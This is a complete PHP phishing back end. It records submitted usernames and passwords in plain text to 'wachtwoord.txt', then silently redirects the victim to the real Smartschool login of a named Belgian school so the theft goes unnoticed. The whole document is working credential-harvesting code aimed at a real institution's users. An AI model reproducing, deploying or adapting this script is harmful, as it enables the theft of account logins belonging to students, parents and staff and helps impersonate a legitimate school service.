<?PHP
$Log = $_POST["username"];
$Pass = $_POST["password"];
$log = fopen("wachtwoord.txt","at");
fwrite($log,"$Log:$Pass\n");
fclose($log);
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://materdeibrasschaat.smartschool.be'></head></html>";
?>